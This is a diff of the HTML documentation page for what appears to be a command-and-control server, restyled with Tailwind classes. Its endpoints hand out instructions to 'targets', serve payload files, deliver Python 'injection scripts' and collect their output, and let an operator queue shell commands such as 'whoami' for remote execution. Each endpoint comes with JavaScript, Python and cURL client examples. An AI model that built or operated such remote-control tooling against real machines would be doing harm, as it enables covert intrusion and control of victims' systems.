-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "delay": 60, "instraction": "check_for_updates" }</pre></div>
-          <div><p class="text-sm p-2 bg-[#e5c07b]/20 text-[#e5c07b] border border-[#e5c07b]/30 rounded inline-block break-words"><span class="bg-[#e5c07b]/30 px-2 py-0.5 rounded mr-2">404</span> Not found</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "Message": "No instraction found" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="api_get_instraction-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_get_instraction-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_get_instraction-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Retrieve current instruction and delay interval for a target.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="api_get_instraction" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="api_get_instraction" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="api_get_instraction" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="api_get_instraction-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="api_get_instraction-js">Copy</button>
+          <div data-code="js" id="api_get_instraction-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('http://SERVER/api/get_instraction/demo_target?token=ABC123').then(r=>r.json()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>requests.get('http://SERVER/api/get_instraction/demo_target', params={'token':'ABC123'}).json()</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -X GET "http://SERVER/api/get_instraction/demo_target?token=ABC123"</code></pre></div>
         </div>
-        <pre id="api_get_instraction-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-fetch('http://SERVER/api/get_instraction/demo_target?token=ABC123&ip=10.0.0.2&os=linux')
-  .then(r=>r.json()).then(d=>{ console.log('Instruction:',d.instraction,'Delay:',d.delay); }).catch(e=>console.error(e));</pre>
-        <pre id="api_get_instraction-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests)
-import requests
-params={'token':'ABC123','ip':'10.0.0.2','os':'linux'}
-try:
-    r=requests.get('http://SERVER/api/get_instraction/demo_target',params=params)
-    d=r.json(); print("Instruction:",d.get('instraction'),"Delay:",d.get('delay'))
-except Exception as e: print(e)</pre>
-        <pre id="api_get_instraction-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -X GET "http://SERVER/api/get_instraction/demo_target?token=ABC123&ip=10.0.0.2&os=linux"</pre>
       </section>
 
-      <!-- 6. /api/lib/<usePyload> -->
-      <section id="api_lib" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api/lib/&lt;usePyload&gt;</h2>
+      <!-- 6. GET /api/lib/<usePyload> -->
+      <section id="api_lib" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api/lib/&lt;usePyload&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Retrieve a library or payload file from the server. This endpoint serves static files that agents may need for their operation.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> The implementation expects the token in the JSON body, which is unusual for GET requests. Consult server code for exact requirements.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Location</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">token</td><td class="p-4">string</td><td class="p-4">body</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">API token</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">ip</td><td class="p-4">string</td><td class="p-4">body</td><td class="p-4"></td><td class="p-4">IP address (optional)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">os</td><td class="p-4">string</td><td class="p-4">body</td><td class="p-4"></td><td class="p-4">OS (optional)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">usePyload</td><td class="p-4">string</td><td class="p-4">path</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Filename of the payload</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">(Raw file content as text/plain)</pre></div>
-          <div><p class="text-sm p-2 bg-[#e5c07b]/20 text-[#e5c07b] border border-[#e5c07b]/30 rounded inline-block break-words"><span class="bg-[#e5c07b]/30 px-2 py-0.5 rounded mr-2">404</span> Not found</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "Error": "File not found" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="api_lib-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_lib-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_lib-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Retrieve a library or payload file from the server.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="api_lib" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="api_lib" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="api_lib" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="api_lib-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="api_lib-js">Copy</button>
+          <div data-code="js" id="api_lib-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('http://SERVER/api/lib/example_payload', {
+  method: 'GET',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({token:'ABC123'})
+}).then(r=>r.text()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>requests.get('http://SERVER/api/lib/example_payload', json={'token':'ABC123'}).text</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -X GET "http://SERVER/api/lib/example_payload" -H "Content-Type: application/json" -d '{"token":"ABC123"}'</code></pre></div>
         </div>
-        <pre id="api_lib-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch) – GET with body (may not be supported by all)
-fetch('http://SERVER/api/lib/example_payload', {
-  method: 'GET', headers: {'Content-Type':'application/json'},
-  body: JSON.stringify({token:'ABC123', ip:'10.0.0.2', os:'linux'})
-}).then(r=>r.text()).then(t=>console.log(t)).catch(e=>console.error(e));</pre>
-        <pre id="api_lib-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests)
-import requests
-payload={'token':'ABC123','ip':'10.0.0.2','os':'linux'}
-try:
-    r=requests.get('http://SERVER/api/lib/example_payload', json=payload)
-    print("File content:", r.text)
-except Exception as e: print(e)</pre>
-        <pre id="api_lib-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -X GET "http://SERVER/api/lib/example_payload" -H "Content-Type: application/json" -d '{"token":"ABC123","ip":"10.0.0.2","os":"linux"}'</pre>
       </section>
 
-      <!-- 7. /api/injection/<target_name> -->
-      <section id="api_injection" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET/POST</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api/injection/&lt;target_name&gt;</h2>
+      <!-- 7. GET|POST /api/injection/<target_name> -->
+      <section id="api_injection" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET/POST</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api/injection/&lt;target_name&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Retrieve or submit Python injection scripts. GET requests fetch the current injection script, while POST requests submit execution results.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Location</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">token</td><td class="p-4">string</td><td class="p-4">query/body</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">API token</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">ip</td><td class="p-4">string</td><td class="p-4">query/body</td><td class="p-4"></td><td class="p-4">IP (optional)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">os</td><td class="p-4">string</td><td class="p-4">query/body</td><td class="p-4"></td><td class="p-4">OS (optional)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">code_output</td><td class="p-4">string</td><td class="p-4">body (POST)</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span> (POST)</td><td class="p-4">Output from executed injection script</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4">path</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Target identifier</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> GET success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "script": "print('Hello from injection')" }</pre></div>
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> POST success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "message": "Injection output saved" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="api_injection-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_injection-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_injection-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Retrieve or submit Python injection scripts.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="api_injection" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="api_injection" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="api_injection" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="api_injection-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="api_injection-js">Copy</button>
-        </div>
-        <pre id="api_injection-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch) – GET script
-fetch('http://SERVER/api/injection/demo_target?token=ABC123')
-  .then(r=>r.json()).then(d=>console.log('Script:',d.script)).catch(e=>console.error(e));
-// POST output
-fetch('http://SERVER/api/injection/demo_target', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token:'ABC123',code_output:'Injection completed'})})
-  .then(r=>r.json()).then(d=>console.log('Server:',d)).catch(e=>console.error(e));</pre>
-        <pre id="api_injection-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests)
-import requests
-# GET
-try: r=requests.get('http://SERVER/api/injection/demo_target',params={'token':'ABC123'}); print("Script:",r.json().get('script'))
-except Exception as e: print(e)
+          <div data-code="js" id="api_injection-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>// GET
+fetch('http://SERVER/api/injection/demo_target?token=ABC123').then(r=>r.json()).then(console.log);
+// POST
+fetch('http://SERVER/api/injection/demo_target', {
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({token:'ABC123', code_output:'Injection completed'})
+});</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code># GET
+requests.get('http://SERVER/api/injection/demo_target', params={'token':'ABC123'}).json()
 # POST
-data={'token':'ABC123','code_output':'Injection completed'}
-try: r=requests.post('http://SERVER/api/injection/demo_target',json=data); print(r.json())
-except Exception as e: print(e)</pre>
-        <pre id="api_injection-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL – GET script
+requests.post('http://SERVER/api/injection/demo_target', json={'token':'ABC123','code_output':'Injection completed'})</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code># GET
 curl -X GET "http://SERVER/api/injection/demo_target?token=ABC123"
-# POST output
-curl -X POST "http://SERVER/api/injection/demo_target" -H "Content-Type: application/json" -d '{"token":"ABC123","code_output":"Injection completed"}'</pre>
+# POST
+curl -X POST "http://SERVER/api/injection/demo_target" -H "Content-Type: application/json" -d '{"token":"ABC123","code_output":"Injection completed"}'</code></pre></div>
+        </div>
       </section>
 
       <!-- ========== WEB-SIDE API ENDPOINTS ========== -->
 
-      <!-- 8. /api_command/<targetName> -->
-      <section id="view_api_command" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET/POST</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api_command/&lt;targetName&gt;</h2>
+      <!-- 8. GET|POST /api_command/<targetName> -->
+      <section id="view_api_command" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET/POST</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api_command/&lt;targetName&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Web interface endpoint for managing commands. GET requests render the web interface, while POST requests add new commands for the specified target.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Requires valid session authentication (web login).</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters (POST JSON)</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">input</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Command text to be executed by the target</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> POST success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "message": "command saved successfully", "id": "cmd123", "target_name": "demo_target" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="view_api_command-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_command-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_command-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Web interface endpoint for managing commands. POST adds new command.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="view_api_command" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="view_api_command" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="view_api_command" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="view_api_command-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="view_api_command-js">Copy</button>
+          <div data-code="js" id="view_api_command-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('/api_command/demo_target', {
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  credentials:'include',
+  body:JSON.stringify({input:'whoami'})
+}).then(r=>r.json()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>session.post('http://SERVER/api_command/demo_target', json={'input':'whoami'}).json()</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -b cookies.txt -X POST "http://SERVER/api_command/demo_target" -H "Content-Type: application/json" -d '{"input":"whoami"}'</code></pre></div>
         </div>
-        <pre id="view_api_command-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch) - requires session cookie
-fetch('/api_command/demo_target', {method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include', body:JSON.stringify({input:'whoami'})})
-.then(r=>r.json()).then(d=>console.log('Command saved:',d)).catch(e=>console.error(e));</pre>
-        <pre id="view_api_command-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests) with session
-import requests
-session = requests.Session()
-# login first...
-try:
-    r = session.post('http://SERVER/api_command/demo_target', json={'input':'whoami'})
-    print(r.json())
-except Exception as e: print(e)</pre>
-        <pre id="view_api_command-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL with cookie
-curl -b cookies.txt -X POST "http://SERVER/api_command/demo_target" -H "Content-Type: application/json" -d '{"input":"whoami"}'</pre>
       </section>
 
-      <!-- 9. /check_command_update/<target_name> -->
-      <section id="view_check_update" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/check_command_update/&lt;target_name&gt;</h2>
+      <!-- 9. GET /check_command_update/<target_name> -->
+      <section id="view_check_update" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/check_command_update/&lt;target_name&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Check for updated command outputs from a target. Used by the web interface to poll for new command results.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Requires valid session authentication.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
